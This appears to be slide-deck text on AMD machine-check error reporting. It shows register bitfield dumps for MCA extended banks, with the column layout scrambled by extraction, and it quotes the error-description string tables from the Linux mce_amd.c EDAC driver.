xxxxxxxxx (      25000001ff)
(   700b000000000)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x        (              80)
2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0
xxxxxxxx (              ff)
(               0)
(               0)
(d01a000000000000)
xxxxxxxxx (      25000001ff)
(   700b000000000)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x        (              80)
--- e

--- e

--- e

--- e

--- e

--- e

|xtended bank 12 ---
6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
ctl (c00020c0):                                                         xxxxxxxx (              ff)
status (c00020c1):                                                                  (               0)
addr (c00020c2):                                                                  (               0)
misc0 (c00020c3): xx x       xx x                                                  (d01a000000000000)
config (c00020c4):                           x  x x                       xxxxxxxxx (      25000001ff)
ipid (c00020c5):              xxx        x xx                                     (   700b000000000)
synd (c00020c6):                                                                  (               0)
reserved (c00020c7):                                                                  (               0)
destat (c00020c8):                                                                  (               0)
deaddr (c00020c9):                                                                  (               0)
misc1 (c00020ca):            x                                                     (  10000000000000)
misc2 (c00020cb):            x                                                     (  10000000000000)
misc3 (c00020cc):            x                                                     (  10000000000000)
misc4 (c00020cd):            x                                                     (  10000000000000)
reserved (c00020ce):                                                                  (               0)
reserved (c00020cf):                                                                  (               0)
mask (c001040c):                                                         x        (              80)
xtended bank 13 ---
6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
ctl (c00020d0):                                                         xxxxxxxx (              ff)
status (c00020d1):                                                                  (               0)
addr (c00020d2):                                                                  (               0)
misc0 (c00020d3): xx x       xx x                                                  (d01a000000000000)
config (c00020d4):                           x  x x                       xxxxxxxxx (      25000001ff)
ipid (c00020d5):              xxx        x xx                                     (   700b000000000)
synd (c00020d6):                                                                  (               0)
reserved (c00020d7):                                                                  (               0)
destat (c00020d8):                                                                  (               0)
deaddr (c00020d9):                                                                  (               0)
misc1 (c00020da):            x                                                     (  10000000000000)
misc2 (c00020db):            x                                                     (  10000000000000)
misc3 (c00020dc):            x                                                     (  10000000000000)
misc4 (c00020dd):            x                                                     (  10000000000000)
reserved (c00020de):                                                                  (               0)
reserved (c00020df):                                                                  (               0)
mask (c001040d):                                                         x        (              80)
xtended bank 14 ---
6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
ctl (c00020e0):                                                         xxxxxxxx (              ff)
status (c00020e1):                                                                  (               0)
addr (c00020e2):                                                                  (               0)
misc0 (c00020e3): xx x       xx x                                                  (d01a000000000000)
config (c00020e4):                           x  x x                       xxxxxxxxx (      25000001ff)
ipid (c00020e5):              xxx        x xx                                     (   700b000000000)
synd (c00020e6):                                                                  (               0)
reserved (c00020e7):                                                                  (               0)
destat (c00020e8):                                                                  (               0)
deaddr (c00020e9):                                                                  (               0)
misc1 (c00020ea):            x                                                     (  10000000000000)
misc2 (c00020eb):            x                                                     (  10000000000000)
misc3 (c00020ec):            x                                                     (  10000000000000)
misc4 (c00020ed):            x                                                     (  10000000000000)
reserved (c00020ee):                                                                  (               0)
reserved (c00020ef):                                                                  (               0)
mask (c001040e):                                                         x        (              80)
xtended bank 15 ---
6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
ctl (c00020f0):                                                                  (               0)
status (c00020f1):                                                                  (               0)
addr (c00020f2):                                                                  (               0)
misc0 (c00020f3):            x                                                     (  10000000000000)
config (c00020f4):                                                                  (               0)
ipid (c00020f5):                                                                  (               0)
synd (c00020f6):                                                                  (               0)
reserved (c00020f7):                                                                  (               0)
destat (c00020f8):                                                                  (               0)
deaddr (c00020f9):                                                                  (               0)
misc1 (c00020fa):            x                                                     (  10000000000000)
misc2 (c00020fb):            x                                                     (  10000000000000)
misc3 (c00020fc):            x                                                     (  10000000000000)
misc4 (c00020fd):            x                                                     (  10000000000000)
reserved (c00020fe):                                                                  (               0)
reserved (c00020ff):                                                                  (               0)
mask (c001040f):                                                                  (               0)
xtended bank 16 ---
6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
ctl (c0002100):                                                                  (               0)
status (c0002101):                                                                  (               0)
addr (c0002102):                                                                  (               0)
misc0 (c0002103):            x                                                     (  10000000000000)
config (c0002104):                                                                  (               0)
ipid (c0002105):                                                                  (               0)
synd (c0002106):                                                                  (               0)
reserved (c0002107):                                                                  (               0)
destat (c0002108):                                                                  (               0)
deaddr (c0002109):                                                                  (               0)
misc1 (c000210a):            x                                                     (  10000000000000)
misc2 (c000210b):            x                                                     (  10000000000000)
misc3 (c000210c):            x                                                     (  10000000000000)
misc4 (c000210d):            x                                                     (  10000000000000)
reserved (c000210e):                                                                  (               0)
reserved (c000210f):                                                                  (               0)
mask (c0010410):                                                                  (               0)
xtended bank 17 ---
6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
ctl (c0002110):                                                           xxxxxx (              3f)
status (c0002111):                                                                  (               0)
addr (c0002112):                                                                  (               0)
misc0 (c0002113): xx x       xx x                        x                         (d01a000001000000)
config (c0002114):                           x  xxx                         xxxxx x (      270000007d)
ipid (c0002115):                         x  x xx              x x    xxxx         (      9600050f00)
synd (c0002116):                                                                  (               0)
reserved (c0002117):                                                                  (               0)
destat (c0002118):                                                                  (               0)
deaddr (c0002119):                                                                  (               0)
misc1 (c000211a): xx x       xx x                        x                         (d01a000001000000)
misc2 (c000211b):            x                                                     (  10000000000000)
misc3 (c000211c):            x                                                     (  10000000000000)
misc4 (c000211d):            x                                                     (  10000000000000)
reserved (c000211e):                                                                  (               0)
reserved (c000211f):                                                                  (               0)
mask (c0010411):                                                                  (               0)
--- ex

--- ex

--- ex

--- ex

--- ex

--- ex

|tended bank 18 ---
6   5   5   4   4   4
0   6   2   8   4   0
ctl (c0002120):
status (c0002121):
addr (c0002122):
misc0 (c0002123): xx x       xx x
config (c0002124):
ipid (c0002125):                         x
synd (c0002126):
reserved (c0002127):
destat (c0002128):
deaddr (c0002129):
misc1 (c000212a): xx x       xx x
misc2 (c000212b):            x
misc3 (c000212c):            x
misc4 (c000212d):            x
reserved (c000212e):
reserved (c000212f):
mask (c0010412):
tended bank 19 ---
6   5   5   4   4   4
0   6   2   8   4   0
ctl (c0002130):
status (c0002131):
addr (c0002132):
misc0 (c0002133): xx x       xx x
config (c0002134):
ipid (c0002135):               x
synd (c0002136):
reserved (c0002137):
destat (c0002138):
deaddr (c0002139):
misc1 (c000213a):            x
misc2 (c000213b):            x
misc3 (c000213c):            x
misc4 (c000213d):            x
reserved (c000213e):
reserved (c000213f):
mask (c0010413):
tended bank 20 ---
6   5   5   4   4   4
0   6   2   8   4   0
ctl (c0002140):
status (c0002141):
addr (c0002142):
misc0 (c0002143): xx x       xx x
config (c0002144):
ipid (c0002145):               x
synd (c0002146):
reserved (c0002147):
destat (c0002148):
deaddr (c0002149):
misc1 (c000214a):            x
misc2 (c000214b):            x
misc3 (c000214c):            x
misc4 (c000214d):            x
reserved (c000214e):
reserved (c000214f):
mask (c0010414):
tended bank 21 ---
6   5   5   4   4   4
0   6   2   8   4   0
ctl (c0002150):
status (c0002151):
addr (c0002152):
misc0 (c0002153):            x
config (c0002154):
ipid (c0002155):
synd (c0002156):
reserved (c0002157):
destat (c0002158):
deaddr (c0002159):
misc1 (c000215a):            x
misc2 (c000215b):            x
misc3 (c000215c):            x
misc4 (c000215d):            x
reserved (c000215e):
reserved (c000215f):
mask (c0010415):
tended bank 22 ---
6   5   5   4   4   4
0   6   2   8   4   0
ctl (c0002160):
status (c0002161):
addr (c0002162):
misc0 (c0002163):            x
config (c0002164):
ipid (c0002165):
synd (c0002166):
reserved (c0002167):
destat (c0002168):
deaddr (c0002169):
misc1 (c000216a):            x
misc2 (c000216b):            x
misc3 (c000216c):            x
misc4 (c000216d):            x
reserved (c000216e):
reserved (c000216f):
mask (c0010416):
tended bank 23 ---
6   5   5   4   4   4
0   6   2   8   4   0
ctl (c0002170):
status (c0002171):
addr (c0002172):
misc0 (c0002173):            x
config (c0002174):
ipid (c0002175):
synd (c0002176):
reserved (c0002177):
destat (c0002178):
deaddr (c0002179):
misc1 (c000217a):            x
misc2 (c000217b):            x
misc3 (c000217c):            x
misc4 (c000217d):            x
reserved (c000217e):
reserved (c000217f):
mask (c0010417):|3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0
xxxxxx (              3f)
(               0)
(               0)
x                         (d01a000001000000)
x  xxx                         xxxxx x (      270000007d)
x xx            x x x    xxxx         (      9600150f00)
(               0)
(               0)
(               0)
(               0)
x                         (d01a000001000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0
xxxxxxxxxxxxxx (            3fff)
(               0)
(               0)
(d01a000000000000)
x  x x                         xxxxxxx (      250000007f)
x xxx                                  (   2002e00000000)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x  (               2)
3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0
xxxxxxxxxxxxxx (            3fff)
(               0)
(               0)
(d01a000000000000)
x  x x                         xxxxxxx (      250000007f)
x xxx                                x (   2002e00000001)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x  (               2)
3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(  10000000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(  10000000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(  10000000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
--

--

--

--

--

--

|- extended bank 24 ---
6   5   5
0   6   2
ctl (c0002180):
status (c0002181):
addr (c0002182):
misc0 (c0002183):            x
config (c0002184):
ipid (c0002185):
synd (c0002186):
reserved (c0002187):
destat (c0002188):
deaddr (c0002189):
misc1 (c000218a):            x
misc2 (c000218b):            x
misc3 (c000218c):            x
misc4 (c000218d):            x
reserved (c000218e):
reserved (c000218f):
mask (c0010418):
- extended bank 25 ---
6   5   5
0   6   2
ctl (c0002190):
status (c0002191):
addr (c0002192):
misc0 (c0002193):            x
config (c0002194):
ipid (c0002195):
synd (c0002196):
reserved (c0002197):
destat (c0002198):
deaddr (c0002199):
misc1 (c000219a):            x
misc2 (c000219b):            x
misc3 (c000219c):            x
misc4 (c000219d):            x
reserved (c000219e):
reserved (c000219f):
mask (c0010419):
- extended bank 26 ---
6   5   5
0   6   2
ctl (c00021a0):
status (c00021a1):
addr (c00021a2):
misc0 (c00021a3):            x
config (c00021a4):
ipid (c00021a5):
synd (c00021a6):
reserved (c00021a7):
destat (c00021a8):
deaddr (c00021a9):
misc1 (c00021aa):            x
misc2 (c00021ab):            x
misc3 (c00021ac):            x
misc4 (c00021ad):            x
reserved (c00021ae):
reserved (c00021af):
mask (c001041a):
- extended bank 27 ---
6   5   5
0   6   2
ctl (c00021b0):
status (c00021b1):
addr (c00021b2):
misc0 (c00021b3): xx x       xx
config (c00021b4):
ipid (c00021b5):
synd (c00021b6):
reserved (c00021b7):
destat (c00021b8):
deaddr (c00021b9):
misc1 (c00021ba):            x
misc2 (c00021bb):            x
misc3 (c00021bc):            x
misc4 (c00021bd):            x
reserved (c00021be):
reserved (c00021bf):
mask (c001041b):
- extended bank 28 ---
6   5   5
0   6   2
ctl (c00021c0):
status (c00021c1):
addr (c00021c2):
misc0 (c00021c3):
config (c00021c4):
ipid (c00021c5):
synd (c00021c6):
reserved (c00021c7):
destat (c00021c8):
deaddr (c00021c9):
misc1 (c00021ca):
misc2 (c00021cb):
misc3 (c00021cc):
misc4 (c00021cd):
reserved (c00021ce):
reserved (c00021cf):
mask (c001041c):
- extended bank 29 ---
6   5   5
0   6   2
ctl (c00021d0):
status (c00021d1):
addr (c00021d2):
misc0 (c00021d3):
config (c00021d4):
ipid (c00021d5):
synd (c00021d6):
reserved (c00021d7):
destat (c00021d8):
deaddr (c00021d9):
misc1 (c00021da):
misc2 (c00021db):
misc3 (c00021dc):
misc4 (c00021dd):
reserved (c00021de):
reserved (c00021df):
mask (c001041d):|4   4   4   3   3   2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(  10000000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
4   4   4   3   3   2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(  10000000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
4   4   4   3   3   2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(  10000000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
4   4   4   3   3   2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0   6   2   8   4   0
xxxxx (              1f)
(               0)
(               0)
x                                                  (d01a000000000000)
x  xxx                         xxxxx x (      270000007d)
x          x xxx                             x xx (   1002e0000000b)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
4   4   4   3   3   2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
4   4   4   3   3   2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)|
|---|---|---|---|---|---|---|---|---|

## Slide 65

static const char * const f15h_mc1_mce_desc[] = { "UC during a demand linefill from L2", "Parity error during data load from IC", "Parity error for IC valid bit", "Main tag parity error", "Parity error in prediction queue", "PFB data/address parity error", "Parity error in the branch status reg", "PFB promotion address error", "Tag error during probe/victimization", "Parity error for IC probe tag valid bit", "PFB non-cacheable bit parity error", "PFB valid bit parity error", /* xec = 0xd */ "Microcode Patch Buffer", /* xec = 010 */ "uop queue", "insn buffer", "predecode buffer", "fetch address FIFO", "dispatch uop queue" };

# generating MCEs

source:https://github.com/torvalds/linux/blob/master/drivers/edac/mce_amd.c

## Slide 66

static const char * const f15h_mc2_mce_desc[] = { "Fill ECC error on data fills", /* xec = 0x4 */ "Fill parity error on insn fills", "Prefetcher request FIFO parity error", "PRQ address parity error", "PRQ data parity error", "WCC Tag ECC error", "WCC Data ECC error", "WCB Data parity error", "VB Data ECC or parity error", "L2 Tag ECC error", /* xec = 0x10 */ "Hard L2 Tag ECC error", "Multiple hits on L2 tag", "XAB parity error", "PRB address parity error" };

generating MCEs

source:https://github.com/torvalds/linux/blob/master/drivers/edac/mce_amd.c

## Slide 67

static const char * const mc4_mce_desc[] = { "DRAM ECC error detected on the NB", "CRC error detected on HT link", "Link-defined sync error packets detected on HT link", "HT Master abort", "HT Target abort", "Invalid GART PTE entry during GART table walk", "Unsupported atomic RMW received from an IO link", "Watchdog timeout due to lack of progress", "DRAM ECC error detected on the NB", "SVM DMA Exclusion Vector error", "HT data error detected on link", "Protocol error (link, L3, probe filter)", "NB internal arrays parity error", "DRAM addr/ctl signals parity error", "IO link transmission error", "L3 data cache ECC error", /* xec = 0x1c */ "L3 cache tag error", "L3 LRU parity bits error", "ECC Error in the Probe Filter directory" };

# generating MCEs

source:https://github.com/torvalds/linux/blob/master/drivers/edac/mce_amd.c

## Slide 68

static const char * const mc5_mce_desc[] = { "CPU Watchdog timer expire", "Wakeup array dest tag", "AG payload array", "EX payload array", "IDRF array", "Retire dispatch queue", "Mapper checkpoint array", "Physical register file EX0 port", "Physical register file EX1 port", "Physical register file AG0 port", "Physical register file AG1 port", "Flag register file", "DE error occurred", "Retire status queue" };

generating MCEs

source:https://github.com/torvalds/linux/blob/master/drivers/edac/mce_amd.c

## Slide 69

static const char * const mc6_mce_desc[] = { "Hardware Assertion", "Free List", "Physical Register File", "Retire Queue", "Scheduler table", "Status Register File", };

generating MCEs

source:https://github.com/torvalds/linux/blob/master/drivers/edac/mce_amd.c

## Slide 70

"Load queue parity" "Store queue parity" "Miss address buffer payload parity" "L1 TLB parity" "DC Tag error type 5" "DC tag error type 6" "DC tag error type 1" "Internal error type 1" "Internal error type 2" "Sys Read data error thread 0" "Sys read data error thread 1" "DC tag error type 2" "DC data error type 1 (poison consumption)" "DC data error type 2" "DC data error type 3" "DC tag error type 4" "L2 TLB parity" "PDC parity error" "DC tag error type 3" "DC tag error type 5" "L2 fill data error" "Error on SCB cacheline state or address field" "Error on SCB data, commit pipe 0" "Error on SCB data, commit pipe 1" "Error on SCB data for non-cacheable DRAM or IO" "System Read Data Error detected by write combine buffer" "Hardware Asserts" "An ECC error was detected on a data cache read by a probe or victimization" "An ECC error or L2 poison was detected on a data cache read by a load" "An ECC error was detected on a data cache read-modify-write by a store" "An ECC error or poison bit mismatch was detected on a tag read by a probe or victimization" "An ECC error or poison bit mismatch was detected on a tag read by a load" "An ECC error or poison bit mismatch was detected on a tag read by a store" "An ECC error was detected on an EMEM read by a load" "An ECC error was detected on an EMEM read-modify-write by a store" "A parity error was detected in an L1 TLB entry by any access" "A parity error was detected in an L2 TLB entry by any access" "A parity error was detected in a PWC entry by any access" "A parity error was detected in an STQ entry by any access" "A parity error was detected in an LDQ entry by any access" "A parity error was detected in a MAB entry by any access" "A parity error was detected in an SCB entry state field by any access" "A parity error was detected in an SCB entry address field by any access" "A parity error was detected in an SCB entry data field by any access" "A parity error was detected in a WCB entry by any access" "A poisoned line was detected in an SCB entry by any access" "A SystemReadDataError error was reported on read data returned from L2 for a load" "A SystemReadDataError error was reported on read data returned from L2 for an SCB store" "A SystemReadDataError error was reported on read data returned from L2 for a WCB store" "A hardware assertion error was reported" "A parity error was detected in an STLF, SCB EMEM entry, store data mask or SRB store data by any access" "microtag probe port parity error" "IC microtag or full tag multi-hit error" "IC full tag parity" "IC data array parity" "PRQ Parity Error" "L0 ITLB parity error" "L1-TLB parity error" "L2-TLB parity error" "BPQ snoop parity on Thread 0" "BPQ snoop parity on Thread 1" "BP L1-BTB Multi-Hit Error" "BP L2-BTB Multi-Hit Error" "L2 Cache Response Poison error" "System Read Data error" "Hardware Assertion Error" "L1-TLB Multi-Hit" "L2-TLB Multi-Hit" "BSR Parity Error" "CT MCE" "L2M Tag Multiple-Way-Hit error" "L2M Tag or State Array ECC Error" "L2M Data Array ECC Error" "Hardware Assert Error" "SDP Read Response Parity Error" "Error initiated by programmable state machine" "Micro-op cache tag array parity error" "Micro-op cache data array parity error" "IBB Register File parity error" "Micro-op queue parity error" "Instruction dispatch queue parity error" "Fetch address FIFO parity error" "Patch RAM data parity error" "Patch RAM sequencer parity error" "Micro-op fetch queue parity error" "Hardware Assertion MCA Error" "Watchdog timeout error" "Physical register file parity error" "Flag register file parity error" "Immediate displacement register file parity error" "Address generator payload parity error" "EX payload parity error" "Checkpoint queue parity error" "Retire dispatch queue parity error" "Retire status queue parity error" "Scheduler queue parity error" "Branch buffer queue parity error" "Hardware Assertion error" "Spec Map parity error" "Retire Map parity error" "Physical register file (PRF) parity error" "Freelist (FL) parity error" "Schedule queue parity error" "NSQ parity error" "Retire queue (RQ) parity error" "Status register file (SRF) parity error" "Hardware assertion" "Physical K mask register file (KRF) parity error" "Shadow tag macro ECC error" "Shadow tag macro multi-way-hit error" "L3M tag ECC error" "L3M tag multi-way-hit error" "L3M data ECC error" "SDP Parity Error from XI" "L3 victim queue Data Fabric error" "L3 Hardware Assertion" "XI WCB Parity Poison Creation event" "Machine check error initiated by DSM action" "Illegal request" "Address violation" "Security violation" "Illegal response" "Unexpected response" "Request or Probe Parity Error" "Read Response Parity Error" "Atomic request parity error" "Probe Filter ECC Error" "Illegal Request" "Address Violation" "Security Violation" "Illegal Response" "Unexpected Response" "Request or Probe Parity Error" "Read Response Parity Error" "Atomic Request Parity Error" "SDP read response had no match in the CS queue" "Probe Filter Protocol Error" "Probe Filter ECC Error" "SDP read response had an unexpected RETRY error" "Counter overflow error" "Counter underflow error" "Illegal Request on the no data channel" "Address Violation on the no data channel" "Security Violation on the no data channel" "Hardware Assert Error" "Shadow Tag Array Protocol Error" "Shadow Tag ECC Error" "Shadow Tag Transaction Error" "Illegal Request" "Address Violation" "Security Violation" "Illegal Response" "Unexpected Response" "Request or Probe Parity Error" "Read Response Parity Error" "Atomic Request Parity Error" "SDP read response had no match in the CS queue" "SDP read response had an unexpected RETRY error" "Counter overflow error" "Counter underflow error" "Probe Filter Protocol Error" "Probe Filter ECC Error" "Illegal Request on the no data channel" "Address Violation on the no data channel" "Security Violation on the no data channel" "Hardware Assert Error" "Hardware assert" "Register security violation" "Link error" "Poison data consumption" "A deferred error was detected in the DF" "Watch Dog Timer" "An SRAM ECC error was detected in the CNLI block" "Register access during DF Cstate" "DSM Error" "DRAM ECC error" "Data poison error on DRAM" "SDP parity error" "Advanced peripheral bus error" "Command/address parity error" "Write data CRC error" "DCQ SRAM ECC error" "AES SRAM ECC error" "ECS Row Error" "ECS Error" "UMC Throttling Error" "Read CRC Error" "Reserved" "Reserved" "Reserved" "Reserved" "RFM SRAM ECC error" "DRAM On Die ECC error" "Data poison error" "SDP parity error" "Reserved" "Address/Command parity error" "HBM Write data parity error" "Consolidated SRAM ECC error" "Reserved" "Reserved" "Rdb SRAM ECC error" "Thermal throttling" "HBM Read Data Parity error" "Reserved" "UMC FW Error" "SRAM Parity Error" "HBM CRC Error" "DRAM ECC error" "Data poison error" "SDP parity error" "Reserved" "Address/Command parity error" "Write data parity error" "DCQ SRAM ECC error" "Reserved" "Read data parity error" "Rdb SRAM ECC error" "RdRsp SRAM ECC error" "LM32 MP errors" "Counter overflow error" "Counter underflow error" "Write Data Parity Error" "Read Response Parity Error" "Cache Tag ECC Error Macro 0" "Cache Tag ECC Error Macro 1" "Cache Data ECC Error" "An ECC error in the Parameter Block RAM array" "An ECC or parity error in a PSP RAM instance" "High SRAM ECC or parity error" "Low SRAM ECC or parity error" "Instruction Cache Bank 0 ECC or parity error" "Instruction Cache Bank 1 ECC or parity error" "Instruction Tag Ram 0 parity error" "Instruction Tag Ram 1 parity error" "Data Cache Bank 0 ECC or parity error" "Data Cache Bank 1 ECC or parity error" "Data Cache Bank 2 ECC or parity error" "Data Cache Bank 3 ECC or parity error" "Data Tag Bank 0 parity error" "Data Tag Bank 1 parity error" "Data Tag Bank 2 parity error" "Data Tag Bank 3 parity error" "Dirty Data Ram parity error" "TLB Bank 0 parity error" "TLB Bank 1 parity error" "System Hub Read Buffer ECC or parity error" "FUSE IP SRAM ECC or parity error" "PCRU FUSE SRAM ECC or parity error" "SIB SRAM parity error" "mpASP SECEMC Error" "mpASP A5 Hang" "SIB WDT error" "An ECC or parity error in an SMU RAM instance" "High SRAM ECC or parity error" "Low SRAM ECC or parity error" "Data Cache Bank A ECC or parity error" "Data Cache Bank B ECC or parity error" "Data Tag Cache Bank A ECC or parity error" "Data Tag Cache Bank B ECC or parity error" "Instruction Cache Bank A ECC or parity error" "Instruction Cache Bank B ECC or parity error" "Instruction Tag Cache Bank A ECC or parity error" "Instruction Tag Cache Bank B ECC or parity error" "System Hub Read Buffer ECC or parity error" "PHY RAS ECC Error" "Reserved" "A correctable error from a GFX Sub-IP" "A fatal error from a GFX Sub-IP" "Reserved" "Reserved" "A poison error from a GFX Sub-IP" "Reserved" "High SRAM ECC or parity error" "Low SRAM ECC or parity error" "Data Cache Bank A ECC or parity error" "Data Cache Bank B ECC or parity error" "Data Tag Cache Bank A ECC or parity error" "Data Tag Cache Bank B ECC or parity error" "Instruction Cache Bank A ECC or parity error" "Instruction Cache Bank B ECC or parity error" "Instruction Tag Cache Bank A ECC or parity error" "Instruction Tag Cache Bank B ECC or parity error" "Fuse SRAM ECC or parity error" "Main SRAM [31:0] bank ECC or parity error" "Main SRAM [63:32] bank ECC or parity error" "Main SRAM [95:64] bank ECC or parity error" "Main SRAM [127:96] bank ECC or parity error" "Data Cache Bank A ECC or parity error" "Data Cache Bank B ECC or parity error" "Data Tag Cache Bank A ECC or parity error" "Data Tag Cache Bank B ECC or parity error" "Instruction Cache Bank A ECC or parity error" "Instruction Cache Bank B ECC or parity error" "Instruction Tag Cache Bank A ECC or parity error" "Instruction Tag Cache Bank B ECC or parity error" "Data Cache Bank A ECC or parity error" "Data Cache Bank B ECC or parity error" "Data Tag Cache Bank A ECC or parity error" "Data Tag Cache Bank B ECC or parity error" "Instruction Cache Bank A ECC or parity error" "Instruction Cache Bank B ECC or parity error" "Instruction Tag Cache Bank A ECC or parity error" "Instruction Tag Cache Bank B ECC or parity error" "Data Cache Bank A ECC or parity error" "Data Cache Bank B ECC or parity error" "Data Tag Cache Bank A ECC or parity error" "Data Tag Cache Bank B ECC or parity error" "Instruction Cache Bank A ECC or parity error" "Instruction Cache Bank B ECC or parity error" "Instruction Tag Cache Bank A ECC or parity error" "Instruction Tag Cache Bank B ECC or parity error" "System Hub Read Buffer ECC or parity error" "MPDMA TVF DVSEC Memory ECC or parity error" "MPDMA TVF MMIO Mailbox0 ECC or parity error" "MPDMA TVF MMIO Mailbox1 ECC or parity error" "MPDMA TVF Doorbell Memory ECC or parity error" "MPDMA TVF SDP Slave Memory 0 ECC or parity error" "MPDMA TVF SDP Slave Memory 1 ECC or parity error" "MPDMA TVF SDP Slave Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 0 ECC or parity error" "MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error" "MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error" "MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error" "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error" "CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error" "SDP Data Parity Error logging" "Data Loss Error" "Training Error" "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Vcid Data Error" "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Replay Attempt Error" "Sync Header Error" "Tx Replay Timeout Error" "Rx Replay Timeout Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Pocket Error" "RAM ECC Error" "ARC instruction buffer parity error" "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0" "Parity error or ECC error for S0 RAM1" "Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0" "Parity error for PHY RAM1" "AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error" "Data Startup Limit Error" "LS0 Exit Error" "PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error" "Reserved" "Rx DataLoss Error" "Replay CECC Error" "Replay UECC Error" "CRC Error" "BER Exceeded Error" "FC Init Timeout Error" "FC Init 